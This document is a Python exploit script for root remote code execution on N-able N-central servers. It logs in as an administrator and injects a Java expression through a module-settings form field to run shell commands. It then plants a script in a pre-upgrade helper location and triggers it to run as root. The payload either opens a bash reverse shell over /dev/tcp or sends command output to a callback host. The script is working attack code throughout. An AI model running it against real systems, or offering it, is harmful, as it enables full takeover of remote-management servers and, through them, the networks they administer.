#!/usr/bin/env python3
import argparse
import base64
import getpass
import os
import socket
import threading
import time

import requests
import urllib3


def main():
    p = argparse.ArgumentParser(description="N-central writable pre-upgrade helper root RCE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--callback-host", required=True)
    p.add_argument("--listen-host", default="0.0.0.0")
    p.add_argument("--callback-port", type=int, default=9002)
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int)
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    reverse = bool(a.lhost or a.lport)
    if reverse and not (a.lhost and a.lport):
        p.error("--lhost and --lport must be supplied together")

    result = []
    listener = None
    if not reverse:
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((a.listen_host, a.callback_port))
        listener.listen(1)

        def accept():
            conn, _ = listener.accept()
            with conn:
                result.append(conn.recv(65535).decode(errors="replace"))

        threading.Thread(target=accept, daemon=True).start()

    if reverse:
        effect = f"/bin/bash -c 'bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1'"
    else:
        encoded = base64.b64encode(a.command.encode()).decode()
        effect = (
            f"out=$(echo {encoded}|base64 -d|/bin/bash 2>&1);"
            f"exec 3<>/dev/tcp/{a.callback_host}/{a.callback_port};printf '%s\\n' \"$out\" >&3"
        )
    payload = (
        "#!/bin/bash\n"
        "trap 'rm -rf /var/opt/n-central/tmp/n-central-upgrade' EXIT\n"
        + effect
        + "\n"
    )
    payload64 = base64.b64encode(payload.encode()).decode()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target = a.target.rstrip("/")
    s = requests.Session()
    s.verify = False
    s.get(target + "/login", timeout=30)
    login = s.post(
        target + "/loginLoginAction.action",
        data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if login.status_code != 302:
        raise SystemExit(f"login={login.status_code}")

    action = target + "/saveModuleSecurityManagerProfilesAction.action"

    def shell(command, timeout=60):
        encoded = base64.b64encode(command.encode()).decode()
        runtime = f"/bin/bash -c echo${{IFS}}{encoded}|/usr/bin/base64${{IFS}}-d|/bin/bash"
        expression = (
            "new com.nable.dms.core.service.system.impl.ProcessServiceImpl()"
            f".executeCommand('{runtime}', {timeout * 1000}L)"
        )
        return s.post(
            action,
            headers={"X-Requested-With": "XMLHttpRequest"},
            data={"ncentralTabId": "upgrade", "currentModule": expression},
            timeout=timeout + 10,
        )

    shell("install -d -m 700 /var/opt/n-central/tmp/n-central-upgrade; : >/var/opt/n-central/tmp/n-central-upgrade/payload.b64")
    for offset in range(0, len(payload64), 120):
        shell("printf '%s' '" + payload64[offset : offset + 120] + "' >>/var/opt/n-central/tmp/n-central-upgrade/payload.b64")
    shell(
        "base64 -d /var/opt/n-central/tmp/n-central-upgrade/payload.b64 "
        ">/var/opt/n-central/tmp/n-central-upgrade/pre-upgrade-checks.sh; "
        "rm -f /var/opt/n-central/tmp/n-central-upgrade/payload.b64; "
        "chmod 700 /var/opt/n-central/tmp/n-central-upgrade/pre-upgrade-checks.sh"
    )
    trigger = shell("/opt/nable/usr/sbin/nable_wrapper.pl preUpgradeChecksTrigger", 120)
    print(f"login={login.status_code}")
    print("stage=ok")
    print(f"trigger={trigger.status_code}")
    if not reverse:
        for _ in range(120):
            if result:
                break
            time.sleep(0.25)
        if result:
            print(result[0].strip())
        listener.close()


if __name__ == "__main__":
    main()
